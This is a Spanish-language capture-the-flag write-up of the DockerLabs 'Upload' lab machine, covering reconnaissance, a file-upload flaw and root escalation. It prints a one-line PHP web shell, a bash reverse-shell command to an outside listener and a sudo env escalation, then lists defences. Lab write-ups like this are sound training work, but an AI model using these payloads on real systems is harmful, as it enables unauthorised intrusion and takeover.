# Upload — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🟢 Fácil  
**SO:** Linux  
**Autor de la máquina:** El Pingüino de Mario  
**Fecha de creación:** 09/04/2024  
**Técnicas:** File Upload · PHP WebShell · Reverse Shell · Gobuster · sudo env abuse · GTFOBins

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [Enumeración web — Gobuster](#2-enumeración-web--gobuster)
3. [File Upload — WebShell PHP](#3-file-upload--webshell-php)
4. [Reverse Shell](#4-reverse-shell)
5. [Escalada de privilegios](#5-escalada-de-privilegios)
6. [Lección aprendida](#6-lección-aprendida)

---

## 1. Despliegue y reconocimiento

Desplegamos la máquina vulnerable:

```bash
sudo bash auto_deploy.sh upload.tar
```

> IP asignada: `172.17.0.2`

Realizamos un escaneo inicial:

```bash
nmap -Pn 172.17.0.2
```

Resultado:

```text
80/tcp open http
```

Enumeramos versiones y servicios:

```bash
nmap -p80 -sCV -Pn 172.17.0.2
```

Resultado:

```text
Apache httpd 2.4.52 ((Ubuntu))
```

---

## 2. Enumeración web — Gobuster

Accedemos al servidor web y observamos una funcionalidad de subida de archivos.

Probamos subiendo un fichero cualquiera y comprobamos que se almacena correctamente.

Enumeramos directorios:

```bash
gobuster dir -u http://172.17.0.2 \
-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
-x php,html,py,txt
```

Resultado:

```text
/index.html
/uploads
/upload.php
```

Exploramos:

```text
http://172.17.0.2/uploads/
```

Observamos que los archivos subidos quedan accesibles públicamente.

---

## 3. File Upload — WebShell PHP

Creamos un archivo PHP malicioso:

```php
<?php
system($_GET['cmd']);
?>
```

Guardamos el fichero como:

```text
prueba.php
```

Lo subimos desde la aplicación web.

Comprobamos ejecución de comandos:

```text
http://172.17.0.2/uploads/prueba.php?cmd=id
```

Resultado:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

La aplicación es vulnerable a **Remote Command Execution** mediante subida de archivos.

---

## 4. Reverse Shell

Nos ponemos en escucha:

```bash
sudo nc -lvnp 443
```

Ejecutamos una reverse shell Bash desde la URL:

```text
http://172.17.0.2/uploads/prueba.php?cmd=bash -c 'bash -i >& /dev/tcp/192.168.1.26/443 0>&1'
```

Obtenemos acceso remoto:

```bash
whoami
www-data
```

Comprobamos privilegios sudo:

```bash
sudo -l
```

Resultado:

```text
(root) NOPASSWD: /usr/bin/env
```

---

## 5. Escalada de privilegios

Consultamos GTFOBins para `env`.

Ejecutamos:

```bash
sudo /usr/bin/env /bin/sh
```

Verificamos privilegios:

```bash
whoami
root
```

✅ Somos **root**.

---

## 6. Lección aprendida

| Vulnerabilidad | Impacto |
|----------------|---------|
| Subida insegura de archivos | Ejecución remota de comandos |
| WebShell PHP | Acceso inicial |
| Reverse Shell | Acceso interactivo al sistema |
| sudo sobre env | Escalada inmediata a root |

**Para defenderse:**

- Restringir subida de archivos ejecutables.
- Validar extensiones y tipos MIME.
- Almacenar uploads fuera del directorio web.
- Evitar binarios peligrosos ejecutables mediante sudo.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al repositorio.*
